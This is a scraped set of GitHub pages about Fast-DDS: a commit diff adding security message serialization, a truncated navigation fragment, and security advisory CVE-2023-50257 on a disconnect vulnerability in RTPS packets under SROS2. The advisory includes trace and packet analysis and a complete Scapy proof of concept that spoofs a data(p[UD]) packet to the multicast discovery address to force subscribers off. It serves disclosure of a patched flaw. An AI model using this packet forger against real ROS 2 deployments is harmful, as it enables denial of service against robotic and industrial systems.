[e186986](/eProsima/Fast-DDS/commit/e1869863c06db7fbb366ae53760fbe6e754be026)

commit 072cbc9

 Show file tree

 Hide file tree

Showing
**18 changed files**
with
**2,021 additions**
and
**84 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* include/fastrtps

  + include/fastrtps/config.h.in
    [config.h.in](#diff-3520a0f04b9bb5991f7276f5605d7a47603a615bdf824e2515b3e198e3adafb2)
  + rtps

    - common

      * include/fastrtps/rtps/common/Token.h
        [Token.h](#diff-2da3a5ba177cb2ab92a506f0265b06dc0238a31bea66f0b69bdeb7787e01298d)
    - messages

      * include/fastrtps/rtps/messages/CDRMessage.h
        [CDRMessage.h](#diff-adad0222602558e6cb9f11a338554479c598109dc8cd1f72b0087c81e69d4bcf)
      * include/fastrtps/rtps/messages/CDRMessage.hpp
        [CDRMessage.hpp](#diff-70831e48263d42b4f7b8aa7757ba381914e09e616f42ee9bdc01c409d39b2e48)
    - security/common

      * include/fastrtps/rtps/security/common/ParticipantGenericMessage.h
        [ParticipantGenericMessage.h](#diff-999ab75ac552a97cdd8f34e3d36d86e11026e86e5ce2153a94a8c80aa1542d86)
* src/cpp

  + src/cpp/CMakeLists.txt
    [CMakeLists.txt](#diff-e3052ec6d01ba5f9ae8d014fd3bdd8653f7e759e704a77bbfdb99ada532923da)
  + rtps

    - common

      * src/cpp/rtps/common/Token.cpp
        [Token.cpp](#diff-8fbdf5ad5c91fbb0dc45a70495d60d0cb8f4b1e8f4a99ab293e8c7f9b01d75f4)
    - security

      * src/cpp/rtps/security/SecurityManager.cpp
        [SecurityManager.cpp](#diff-196ca7d94f1ae6a62cc591590a6742796c6201afbdbfe84ebedd40d225e12888)
      * src/cpp/rtps/security/SecurityManager.h
        [SecurityManager.h](#diff-d0e76b0709b7fdbad6b50985d69084bbaab457688e79fe98e2df5805a0da2787)
* test

  + mock/rtps

    - RTPSParticipantImpl/rtps/participant

      * test/mock/rtps/RTPSParticipantImpl/rtps/participant/RTPSParticipantImpl.h
        [RTPSParticipantImpl.h](#diff-398cbffc6fc59baa2b62a7825b0162442ea7839177864a734b3da7722f88da3c)
    - RTPSReader/fastrtps/rtps/reader

      * test/mock/rtps/RTPSReader/fastrtps/rtps/reader/RTPSReader.h
        [RTPSReader.h](#diff-b91214ad08dd0cb44ff17b2e23873264e55d768fa0e4edfaec67e27436c75336)
    - RTPSWriter/fastrtps/rtps/writer

      * test/mock/rtps/RTPSWriter/fastrtps/rtps/writer/RTPSWriter.h
        [RTPSWriter.h](#diff-a96e250e5f8f769cf83b34568a49ccf3588ba30fa7938b619ad659b5d6d2120e)
    - ReaderHistory/fastrtps/rtps/history

      * test/mock/rtps/ReaderHistory/fastrtps/rtps/history/ReaderHistory.h
        [ReaderHistory.h](#diff-cf31267752a7c01824a69c195677dd006476c191942f4fc77fbe169f0a0fc9b4)
    - SecurityPluginFactory

      * test/mock/rtps/SecurityPluginFactory/SecurityPluginFactory.cpp
        [SecurityPluginFactory.cpp](#diff-f459940d1fdeea46995639c40998f5426456e8d5f83f9597e7b0776ffdead801)
    - StatelessWriter/fastrtps/rtps/writer

      * test/mock/rtps/StatelessWriter/fastrtps/rtps/writer/StatelessWriter.h
        [StatelessWriter.h](#diff-1a3451316d7d9f93334ca804335a73ff26905c041b765274bde193025fffe5b3)
    - WriterHistory/fastrtps/rtps/history

      * test/mock/rtps/WriterHistory/fastrtps/rtps/history/WriterHistory.h
        [WriterHistory.h](#diff-10cc03d5c9aeec714b862e901fdda02a6c678fda63c94faaebe7104ce8487f3a)
  + unittest/rtps/security

    - test/unittest/rtps/security/CMakeLists.txt
      [CMakeLists.txt](#diff-513982f2e51cc8322e699ffb384607b106c6dcc9efc0d938e08c3572b8f38081)
    - test/unittest/rtps/security/SecurityAuthenticationTests.cpp
      [SecurityAuthenticationTests.cpp](#diff-211b479db613ab983bece6a1cf4295d618cb685101f79c1c1ca23715d35defef)

## There are no files selected for viewing

5 changes: 5 additions & 0 deletions

5
[include/fastrtps/config.h.in](#diff-3520a0f04b9bb5991f7276f5605d7a47603a615bdf824e2515b3e198e3adafb2 "include/fastrtps/config.h.in")

Show comments

[View file](/eProsima/Fast-DDS/blob/072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4/include/fastrtps/config.h.in)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -63,4 +63,9 @@ |
|  |  | #endif |
|  |  | #endif |
|  |  |  |
|  |  | // Security |
|  |  | #ifndef SECURITY |
|  |  | #define SECURITY @HAVE\_SECURITY@ |
|  |  | #endif |
|  |  |  |
|  |  | #endif // \_FASTRTPS\_CONFIG\_H\_ |

8 changes: 8 additions & 0 deletions

8
[include/fastrtps/rtps/common/Token.h](#diff-2da3a5ba177cb2ab92a506f0265b06dc0238a31bea66f0b69bdeb7787e01298d "include/fastrtps/rtps/common/Token.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4/include/fastrtps/rtps/common/Token.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -132,6 +132,14 @@ class DataHolderHelper |
|  |  | static BinaryProperty\* find\_binary\_property(DataHolder& data\_holder, const std::string& name); |
|  |  |  |
|  |  | static const BinaryProperty\* find\_binary\_property(const DataHolder& data\_holder, const std::string& name); |
|  |  |  |
|  |  | static size\_t serialized\_size(const DataHolder& data\_holder, size\_t current\_alignment = 0); |
|  |  |  |
|  |  | static size\_t serialized\_size(const DataHolderSeq& data\_holders, size\_t current\_alignment = 0); |
|  |  |  |
|  |  | private: |
|  |  |  |
|  |  | inline static size\_t alignment(size\_t current\_alignment, size\_t dataSize) { return (dataSize - (current\_alignment % dataSize)) & (dataSize-1);} |
|  |  | }; |
|  |  |  |
|  |  | } //namespace rtps |
| Expand Down | |  |

18 changes: 18 additions & 0 deletions

18
[include/fastrtps/rtps/messages/CDRMessage.h](#diff-adad0222602558e6cb9f11a338554479c598109dc8cd1f72b0087c81e69d4bcf "include/fastrtps/rtps/messages/CDRMessage.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4/include/fastrtps/rtps/messages/CDRMessage.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -26,6 +26,10 @@ |
|  |  | #include "../common/Property.h" |
|  |  | #include "../common/BinaryProperty.h" |
|  |  |  |
|  |  | #ifdef SECURITY |
|  |  | #include "../security/common/ParticipantGenericMessage.h" |
|  |  | #endif |
|  |  |  |
|  |  | using namespace eprosima::fastrtps; |
|  |  |  |
|  |  | namespace eprosima { |
| Expand Down  Expand Up | | @@ -53,6 +57,7 @@ namespace CDRMessage{ |
|  |  | inline bool readDataReversed(CDRMessage\_t\* msg, octet\* o, uint32\_t length); |
|  |  | inline bool readInt32(CDRMessage\_t\* msg,int32\_t\* lo); |
|  |  | inline bool readUInt32(CDRMessage\_t\* msg, uint32\_t\* ulo); |
|  |  | inline bool readInt64(CDRMessage\_t\* msg, int64\_t\* lolo); |
|  |  | inline bool readSequenceNumber(CDRMessage\_t\* msg, SequenceNumber\_t\* sn); |
|  |  | inline bool readInt16(CDRMessage\_t\* msg,int16\_t\* i16); |
|  |  | inline bool readUInt16(CDRMessage\_t\* msg,uint16\_t\* i16); |
| Expand All | | @@ -63,6 +68,15 @@ namespace CDRMessage{ |
|  |  | inline bool readTimestamp(CDRMessage\_t\*msg,Time\_t\* ts); |
|  |  | inline bool readString(CDRMessage\_t\*msg,std::string\* p\_str); |
|  |  | inline bool readOctetVector(CDRMessage\_t\*msg,std::vector<octet>\* ocvec); |
|  |  |  |
|  |  | inline bool readProperty(CDRMessage\_t\* msg, Property& property); |
|  |  | inline bool readBinaryProperty(CDRMessage\_t\* msg, BinaryProperty& binary\_property); |
|  |  | inline bool readPropertySeq(CDRMessage\_t\* msg, PropertySeq& properties); |
|  |  | inline bool readBinaryPropertySeq(CDRMessage\_t\* msg, BinaryPropertySeq& binary\_properties); |
|  |  | inline bool readDataHolder(CDRMessage\_t\* msg, DataHolder& data\_holder); |
|  |  | inline bool readDataHolderSeq(CDRMessage\_t\* msg, DataHolderSeq& data\_holders); |
|  |  | inline bool readMessageIdentity(CDRMessage\_t\* msg, ::security::MessageIdentity& message\_identity); |
|  |  | inline bool readParticipantGenericMessage(CDRMessage\_t\* msg, ::security::ParticipantGenericMessage& message); |
|  |  | ///@} |
|  |  |  |
|  |  |  |
| Expand Down  Expand Up | | @@ -121,6 +135,10 @@ namespace CDRMessage{ |
|  |  | inline bool addPropertySeq(CDRMessage\_t\* msg, const PropertySeq& properties); |
|  |  | inline bool addBinaryPropertySeq(CDRMessage\_t\* msg, const BinaryPropertySeq& binary\_properties); |
|  |  | inline bool addBinaryPropertySeq(CDRMessage\_t\* msg, const BinaryPropertySeq& binary\_properties, const std::string& property\_limit); |
|  |  | inline bool addDataHolder(CDRMessage\_t\* msg, const DataHolder& data\_holder); |
|  |  | inline bool addDataHolderSeq(CDRMessage\_t\* msg, const DataHolderSeq& data\_holders); |
|  |  | inline bool addMessageIdentity(CDRMessage\_t\* msg, const ::security::MessageIdentity& message\_identity); |
|  |  | inline bool addParticipantGenericMessage(CDRMessage\_t\* msg, const ::security::ParticipantGenericMessage& message); |
|  |  | } |
|  |  |  |
|  |  | } |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `072cbc9`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2F072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e3a10f07_20250110_231639.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fsecurity%2Fadvisories%2FGHSA-v5r6-8mvh-cp98)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fsecurity%2Fadvisories%2FGHSA-v5r6-8mvh-cp98)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=eProsima%2FFast-DDS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eProsima](/eProsima)
/
**[Fast-DDS](/eProsima/Fast-DDS)**
Public

* [Notifications](/login?return_to=%2FeProsima%2FFast-DDS) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2FeProsima%2FFast-DDS)
* [Star
   2.3k](/login?return_to=%2FeProsima%2FFast-DDS)

* [Code](/eProsima/Fast-DDS)
* [Issues
  48](/eProsima/Fast-DDS/issues)
* [Pull requests
  78](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects
  0](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

Additional navigation options

* [Code](/eProsima/Fast-DDS)
* [Issues](/eProsima/Fast-DDS/issues)
* [Pull requests](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

# Disconnect Vulnerability in RTPS Packets Used by SROS2

Critical

[MiguelCompany](/MiguelCompany)
published
GHSA-v5r6-8mvh-cp98
Feb 19, 2024

## Package

No package listed

## Affected versions

< 2.13.0 / < 2.12.2 / < 2.11.3 / < 2.10.3 / < 2.6.7

## Patched versions

2.13.0 / 2.12.2 / 2.11.3 / 2.10.3 / 2.6.7

FastDDS, RMW - FastDDS
(ROS 2 IRON)

(FastDDS) 2.10.2-2, (RMW - FastDDS) 7.1.1-2

(FastDDS) 2.10.3

FastDDS, RMW - FastDDS
(ROS 2 HUMBLE)

(FastDDS) 2.6.6-1, (RMW - FastDDS) 6.2.3.1

(FastDDS) 2.6.7

FastDDS, RMW - FastDDS
(ROS 2 GALACTIC)

(FastDDS) 2.3.6-6, (RMW - FastDDS) 5.0.2-1

None, ROS 2 GALACTIC reached end-of-life

FastDDS, RMW - FastDDS
(ROS 2 FOXY)

(FastDDS) 2.1.4-1, (RMW - FastDDS) 1.3.2-1

None, ROS 2 FOXY reached end-of-life

## Description

# 1. Summary

* Even with the application of SROS2, due to the issue where the data (p[UD]) and guid values used to disconnect between nodes are not encrypted, a vulnerability has been discovered where a malicious attacker can forcibly disconnect a Subscriber and can deny a Subscriber attempting to connect.
* Afterwards, if the attacker sends the packet for disconnecting, which is data(p[UD]), to the Global Data Space (239.255.0.1:7400) using the said Publisher ID, all the Subscribers (Listeners) connected to the Publisher (Talker) will not receive any data and their connection will be disconnected. Moreover, if this disconnection packet is sent continuously, the Subscribers (Listeners) trying to connect will not be able to do so.

# 2. Details

* ### **Subscriber Function Analysis**

  #### 1. ROS2 IRON Source Code Build

  ```
    - colcon build --symlink-install --cmake-args -DBUILD_TESTING:=OFF -DCMAKE_CXX_FLAGS:=-pg -DCMAKE_EXE_LINKER_FLAGS=-pg -DCMAKE_SHARED_LINKER_FLAGS=-pg -DCMAKE_BUILD_TYPE=RelWithDebInfo -DSECURITY=ON

  ```
  #### 2. Uftrace

  + <https://github.com/namhyung/uftrace/pulls>
  + uftrace is a function call graph tracing program for C, C++, Rust, and Python programs.
  + uftrace record -a ~/ros2\_iron/build/demo\_nodes\_cpp/listener --ros-args --enclave /talker\_listener/listener
    - uftrace replay -N ^std > sub[listener]\_fastrtps\_attack\_replay.txt
    - I put the related uftrace file on our github. [LINK](https://github.com/Desglaneurs/BoB_Des_glaneurs/tree/main/Disconnect/uftrace%20and%20pcap)
  + We analyzed the flow of a normal Subscriber and the flow of a Subscriber after an attack using the Uftrace tool.
  + The part that starts to differ is at 'attack: 533319 line' and 'normal - 491897 line'.
  + As a result of uftrace analysis, after the PDPListener::onNewCacheChagedAdded function is called in the line "attack:533623" as shown in Figure 1, the process of erasing the Participant information begins. After that, in Figure 2, it was finally confirmed that the Participant information was finally deleted.
  + **Picture1. When the attacker transmits Data(p[UD]), the process transitions to the Participant deletion phase.**

    [![image](https://user-images.githubusercontent.com/146199020/277166638-3fbe0767-4466-4887-945b-ff366f5808b7.png)](https://user-images.githubusercontent.com/146199020/277166638-3fbe0767-4466-4887-945b-ff366f5808b7.png)
  + **Picture2. Lastly, the part where the Participant information is ultimately deleted.**

    [![image](https://user-images.githubusercontent.com/146199020/277166642-b977c6f9-0eec-4dc2-aff7-7fe85fa9ccd6.png)](https://user-images.githubusercontent.com/146199020/277166642-b977c6f9-0eec-4dc2-aff7-7fe85fa9ccd6.png)
* ### **Analysis Code**

  + Data(p[UD]) invokes the remove\_participant function, which in turn deletes entities like remove\_Writer and remove\_Reader.
  + The SecurityManager executes the SecurityManager::init function only once based on the Participant GUID when initially running the node.
  + eProsima/Fast-DDS/tree/2.10.x/src/cpp/rtps/security/**SecurityManager.cpp:117, 793**
  ```
  bool SecurityManager::init()
  bool SecurityManager::on_process_handshake()
  ```
  + In SROS2, the SecurityManager of DDS tokenizes each node's Participant, Endpoint, and UserData information and stores them in handles like permission\_handle and identity\_handle. The deletion of these pieces of information is not performed by the remove\_participant function, but rather when the SecurityManager is completely deleted or initialized using the SecurityManager::init function.
    - As a result of the analysis of the "Security Manager::init function", the function deletes all relevant information (ex: token, Security Manager, etc.) when deleting the node (Ex: Ctrl+c: SIGINT).
  + Therefore, even if a malicious attacker manipulates Data(p[UD]) and sends it to the Global Data Space area to disconnect the Pub/Sub connection, since Data(p[UD])(ex: guid) only deletes the information of the Participant, the SecurityManager is not initialized.
  + To reconnect between Pub/Subs here, you must run the Security Manager::init function and reconnect through the on\_process\_handshake function.
  + In summary, even if a malicious attacker uses Data(p[UD]) to disconnect the Pub/Sub connection, the node's information does not disappear completely. As a result, the SecurityManager continues to hold information related to the Participant's GUID, such as tokens. Therefore, even if the Subscriber sends Data(p) to the Global Data Space every 4 seconds, the SecurityManager::init function does not re-execute due to the duplicated GUID. Consequently, the packet is ignored and no reconnection takes place.
* ### **Analysis Packet**

  + I put the related packtet file on our github. [LINK](https://github.com/Desglaneurs/BoB_Des_glaneurs/tree/main/Disconnect/uftrace%20and%20pcap)
  + In SROS2, there was a problem where packets sent to the Global Data Space area (e.g., Participant ID) were not encrypted.
  + As a result, an attacker within the same Global Data Space can eavesdrop on the Publisher's Participant ID.
  + Furthermore, if one can obtain the Publisher's Participant ID, it's possible to impersonate that specific node. Therefore, when an attacker sends tampered packets like data(p[UD]) using the acquired Participant ID, proper verification was not carried out.

    [![image](https://user-images.githubusercontent.com/146199020/277167680-491ec812-2d81-45c7-937d-8c6834425fce.png)](https://user-images.githubusercontent.com/146199020/277167680-491ec812-2d81-45c7-937d-8c6834425fce.png)
  + **before the attack**
    - When the Publisher (192.168.177.151) sends a packet, the Subscriber (192.168.177.153) sends a response packet.

      [![image](https://user-images.githubusercontent.com/146199020/277167775-8865d360-1791-4276-a516-dd38136d74c2.png)](https://user-images.githubusercontent.com/146199020/277167775-8865d360-1791-4276-a516-dd38136d74c2.png)
  + **after an attack**
    - The Publisher (192.168.177.151) sends a packet to the Subscriber (192.168.177.153), but there is no response.

      [![image](https://user-images.githubusercontent.com/146199020/277167838-b5b07ecf-cbbc-45f1-b0ed-40804bf73fde.png)](https://user-images.githubusercontent.com/146199020/277167838-b5b07ecf-cbbc-45f1-b0ed-40804bf73fde.png)

# 3. PoC

* ### **Attack Environment Required Info**

  + Operating System : Ubuntu 20.04 ~ 22.04 LTS
  + ROS2 IRON (192.168.177.151, 192.168.177.153)
  + The attack was successful in both the source code build (release mode) and the packaged environment.
  + [Attacker]
    - While in RTPS communication with SROS2 applied, packets being sent to the Global Data Space (239.255.0.1:7400) are sniffed. After that, using Scapy, a packet named data(p[UD]) which terminates the connection (by referencing guid, src IP, sport) is generated. Following this, the data(p[UD]) packet is dispatched to the Global Data Space.
  + [Victim]
    - All Subscribers (Listeners) connected to the Publisher (Talker) are unable to receive data and are forcibly disconnected.
  + PoC Code
    ```
    from scapy.all import *
    from scapy.contrib.rtps import *

    hostId = 0xdaf710ce
    appId = 0xd9774bc6
    instanceId = 0xd4359e60
    entityId = 0x00001c1

    class PacketSENTINEL(PIDPacketBase):
        name = "PID_SENTINEL"
        fields_desc = [
            EField(XIntField("parameter_id", 0x0001), endianness=FORMAT_LE),
        ]

    class participantId(EPacket):
        name = "participantId"
        fields_desc = [
            XIntField("hostId", hostId),
            XIntField("appId", appId),
            XIntField("instanceId", instanceId),
            XIntField("entity", entityId),
        ]

    class UnknownPacket(EPacket):
        name = "Unknown"
        fields_desc = [
       EField(ShortField("parameter_id", 0x800f), endianness=FORMAT_LE),
            EField(ShortField("parameter_length", 0x0018), endianness=FORMAT_LE),
            PacketListField("participantId", [participantId()], participantId),
            XIntField("parameter1",0x00000000),
            XIntField("parameter2",0x01000000),
        ]

    class KeyHashPacket(EPacket):
        name = "Data Packet"
        fields_desc = [
       EField(ShortField("parameter_id", 0x0070), endianness=FORMAT_LE),
            EField(ShortField("parameter_length", 0x0010), endianness=FORMAT_LE),
            PacketListField("participantId", [participantId()], participantId),
        ]

    class StatusPacket(EPacket):
        name = "status info"
        fields_desc = [
           EField(ShortField("parameter_id", 0x0071), endianness=FORMAT_LE),
            EField(ShortField("parameter_length", 0x0004), endianness=FORMAT_LE),
            XIntField("flags", 0x00000003),
        ]

    class InlineQoSPacket(EPacket):
        name = "Inline QoS"
        fields_desc = [
            PacketField("UnknownPacket", UnknownPacket(), UnknownPacket),
            PacketField("KeyHashPacket", KeyHashPacket(), KeyHashPacket),
            PacketField("StatusPacket", StatusPacket(), StatusPacket),
            PacketField("sentinel", PacketSENTINEL(), PacketSENTINEL),
        ]

    class RTPS(Packet):
        name = "RTPS Header"
        fields_desc = [
            XIntField("magic", 0x52545053),  # RTPS in hex
            XByteField("major", 2),
            XByteField("minor", 3),
            XShortField("vendor_id", 0x010f),
            XIntField("hostId", hostId),
            XIntField("appId", appId),
            XIntField("instanceId", instanceId),
       ]

    class RTPSSubMessage_DATA(EPacket):
        name = "RTPS DATA"
        fields_desc = [
            XByteField("submessageId", 0x15),  # DATA
            XByteField("flags", 0x03),  # Data present, Endianness bit
            ShortField("octetsToNextHeader", 0x5000),
            XNBytesField("extraFlags", 0x0000, 2),
            EField(ShortField("octetsToInlineQoS", 0x1000), endianness_from=e_flags),
            X3BytesField("readerEntityIdKey", 0x000100),
            XByteField("readerEntityIdKind", 0xc7),  # Application-defined unknown kind
            X3BytesField("writerEntityIdKey", 0x000100),
            XByteField("writerEntityIdKind", 0xc2),  # Built-in writer (with key)
            EField(IntField("writerSeqNumHi", 0x00000000), endianness_from=e_flags),
            EField(IntField("writerSeqNumLow", 0x02000000), endianness_from=e_flags),
            PacketField("inline_qos", InlineQoSPacket(), InlineQoSPacket),
        ]

    packet = Ether() / \
       IP(src="192.168.177.151",dst="239.255.0.1") / \
       UDP(sport=37005,dport=7400) / RTPS() / RTPSSubMessage_DATA()
    sendp(packet, iface="ens33")
    ```
* **FastDDS Version**
  + Successful exploitation in all ROS2 versions

    | ROS2 Version | FastDDS | RMW - FastDDS | Attack Result |
    | --- | --- | --- | --- |
    | IRON | 2.10.2-1 | 7.1.1-2 | O |
    | HUMBLE | 2.6.6-1 | 6.2.3.1 | O |
    | GALACTIC | 2.3.6-6 | 5.0.2-1 | O |
    | FOXY | 2.1.4-1 | 1.3.2-1 | O |

# 4. Impact

* A remote attacker can forcibly disconnect the Subscriber, and once disconnected, reconnection does not occur.

[![image](https://user-images.githubusercontent.com/146199020/277168620-03a1c130-d656-4ca9-8ec5-413314f774e5.png)](https://user-images.githubusercontent.com/146199020/277168620-03a1c130-d656-4ca9-8ec5-413314f774e5.png)

### 4.1. Affected Version

* Commint Analysis
* eProsima/Fast-DDS/tree/2.10.x/src/cpp/rtps/security/SecurityManager.cpp:117, 793

  | COMMIT TIME | COMMIT ID | Issue | code |
  | --- | --- | --- | --- |
  | Nov 8, 2016 | [e186986](https://github.com/eProsima/Fast-DDS/commit/e1869863c06db7fbb366ae53760fbe6e754be026) | Initial Contribution | SecurityManager::init() |
  | Nov 16, 2016 | [072cbc9](https://github.com/eProsima/Fast-DDS/commit/072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4) | Initial Contribution | SecurityManager::on\_process\_handshake() |
  | Jun 5, 2023 | [f07a021](https://github.com/eProsima/Fast-DDS/commit/f07a0213e655202188840b864be4438ae1067a13) | latest Contribution | - |

  + Since the initial commit of the SecurityManager.cpp code (init, on\_process\_handshake) on Nov 8, 2016, Disconnect Vulnerability in RTPS Packets Used by SROS2 have been present up to the current date.

### Severity

Critical

9.7

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Adjacent

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2023-50257

### Weaknesses

No CWEs

### Credits

* [![@Desglaneurs](https://avatars.githubusercontent.com/u/146199020?s=40&v=4)](/Desglaneurs)
  [Desglaneurs](/Desglaneurs)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1cc8cdc0_20250110_231633.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Fe1869863c06db7fbb366ae53760fbe6e754be026)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
